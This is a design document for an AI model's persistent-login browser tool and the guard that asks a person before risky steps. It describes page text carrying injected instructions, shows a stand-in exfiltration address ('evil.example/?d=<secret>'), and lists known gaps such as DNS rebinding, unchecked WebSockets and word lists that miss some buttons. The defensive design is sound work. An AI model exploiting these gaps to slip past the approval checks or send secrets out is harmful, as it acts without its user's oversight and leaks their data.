# Browse

Folder: `gateway/modules/browse/`. The assistant uses a Chromium browser (Playwright) with a
profile that stays between runs. Logins stay too. One profile for each identity.

## What it does

- `open URL`: opens a page and returns title, address and main text.
- `text` (`max`, default 6000, up to 40,000; `all`), `links` (`word` filters), `shot` (a PNG in
  `<agentCwd>/outbox`).
- `click`, `type`, `press`: act on the page by the exact visible text, label, placeholder, or a CSS
  selector.
- A page that needs a login returns `LOGIN NEEDED`. A bot check returns `BLOCKED`.
- The same actions exist for your own Claude Code sessions: `gateway/bin/browse.js` and the
  `web-browse` skill.

## Config keys (`modules.browse`)

- `identity`: the profile name. Default `assistant`. The profile is `<dataDir>/browser/<identity>`.
- `browserPath`: a Chrome or Chromium program. Default: Playwright's Chromium.
- `proxy`: for example `socks5://127.0.0.1:1080`.

## Secrets

None. Logins are cookies in the profile. You make them in a visible window with
`chrome-step.js login`. See [setup](setup.md).

## What runs freely, what asks

Your logins live in this profile. So a click can send mail as you. The rules follow from that.

- Always free: `text`, `links`, `shot`. They only read.
- Every browse tool taints the conversation: page text is written by someone else and can carry
  instructions. The taint stays until a new conversation.
- `open`: free before the conversation is tainted. After that, it is free only for an address that
  can carry nothing out: no query, no `#` part, no long path part. Example: `open
  https://evil.example/?d=<secret>` asks you. `open https://example.com/news` is free.
- `click`, `type`, `press`: after the conversation is tainted, every one asks you. In practice that
  is every step after the first page.
- Before the taint, a step is free unless it really acts. The gateway looks at the live page and
  judges the element the step would hit, not the agent's words:
  - a form's submit button (also a `<button>` with no type, or a wrapper that holds one) asks;
  - a name with a word like send, submit, pay, buy, order, book, delete, publish, share (Hebrew,
    Arabic, Russian and several European languages) asks. The name includes `aria-label`, icon
    `alt` text and `title`;
  - a page address that looks like a checkout asks;
  - a key other than Tab, Shift+Tab, Escape, the arrows, Page Up/Down, Home and End asks. So Enter,
    Control+Enter and Meta+Enter (send in Gmail), Space and single-letter shortcuts ask.
- A free step is judged again right before it acts, on the element it really acts on. A page that
  changed in between gets a refusal, and the next call asks you.
- Names match exactly. `click "Sen"` does not find "Send".
- The 🌐 prompt shows what the step really hits, for example
  `Click "button[type=submit]" → button "Continue" (submits a form)`.

## The rules, in code (`guard.js`)

- Only public `http` and `https` addresses. Your machine, home network, VPN ranges and cloud
  metadata addresses are refused. The check also runs after DNS, so a public name that points to
  `127.0.0.1` is refused.
- The check covers every request of the browser, not only page loads: images, scripts, `fetch()`
  and redirects too. A blocked request is aborted. For a page's files the answer is kept for each
  origin for 30 seconds, because a page loads hundreds of files from a few hosts. Page loads are
  checked each time.
- Service workers are blocked: their requests would skip the check.
- No credentials in the address.
- The agent never types into password, card, security code or one-time code fields.

## Limits and known issues

- DNS rebinding: the gateway resolves a name, then Chrome resolves it again by itself. A name can
  answer a public address to the gateway and `127.0.0.1` to Chrome a moment later. The 30-second
  cache for a page's files widens this window a little. The fix would be a proxy that connects to
  the address it checked; there is none yet.
- WebSockets and WebRTC are not checked (`routeWebSocket` would replace every page's WebSocket
  with Playwright's shim). Chrome's own Local Network Access rules still apply.
- The CLI browser (`bin/browse.js`, attached over CDP) cannot block service workers.
- Before the taint, the word list and the submit check are only a best effort. A JavaScript
  button with an unusual name in an uncovered language may pass. After the taint everything asks.
- An approved step is not judged again. If the page changes between your yes and the click, the
  click goes to what is there then (the element is pinned at click time, not at approval time).
- Pages that need a login by a person must be done by you in a visible window.
- Two logins in one profile can log the first one out. Use one identity for each account.
- The browser tool of the CLI (`bin/browse.js`) is a separate Chrome with a local debugging port
  on 127.0.0.1. It keeps its profile in `~/.assistant/browser/<identity>`.
- Not yet tried with a real login. See [live checks](../live-checks.md).
